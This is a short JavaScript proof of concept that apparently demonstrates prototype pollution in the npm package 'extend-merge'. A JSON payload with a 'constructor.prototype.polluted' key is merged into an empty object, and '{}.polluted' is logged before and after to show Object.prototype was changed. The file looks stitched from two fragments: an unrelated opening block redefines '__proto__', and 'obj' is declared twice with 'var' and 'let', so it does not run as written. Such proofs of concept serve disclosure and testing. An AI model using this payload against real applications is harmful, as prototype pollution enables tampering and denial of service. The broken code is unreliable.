var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const extend_merge = require('extend-merge');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
let obj = {};
console.log({}.polluted);
extend_merge.merge(obj, payload);
console.log({}.polluted);